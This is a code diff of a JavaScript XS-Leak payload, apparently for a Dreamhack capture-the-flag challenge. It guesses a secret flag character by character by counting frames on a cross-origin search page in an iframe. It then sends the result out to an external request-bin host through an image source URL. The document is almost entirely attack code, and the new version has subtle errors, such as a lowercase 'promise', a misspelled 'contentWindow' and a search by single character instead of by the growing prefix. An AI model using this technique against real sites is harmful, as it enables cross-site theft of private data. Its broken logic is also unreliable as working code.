@@ -1,7 +1,36 @@
 <iframe id='a'></iframe>
 <img id='b'>
 <script>
-  var c=document.getElementById('a')
-  c.src="http://127.0.0.1:8000/search?query=DH{"
-  c.onload=function(){b.src=`https://srzzwcg.request.dreamhack.games/${a.contentWindow.frames.length}`}
+  async function A(d){
+    return await new promise(function(e,f){
+      let c=document.getElementById('a')
+      c.src=`http://127.0.0.1:8000/search?query=${d}`
+      c.onload=function(){
+        if (a.content.Window.frames.length==1)
+          return e()
+        else
+          return f()
+      }
+    })
+  }
+  async function B(d){
+    try{
+      await A(d)
+      return true
+    }catch(e){return false}
+  }
+  async function C(){
+    let e="DH{"
+    let f="0123456789abcdef"
+    for(let z=0;z<34;z=z+1){
+      for(let y of f){
+        if(await B(y)){
+          e=e+y
+          break
+        }
+      }
+    }
+    b.src=`https://zfnitmw.request.dreamhack.games/${e}`
+  }
+  C()
 </script>
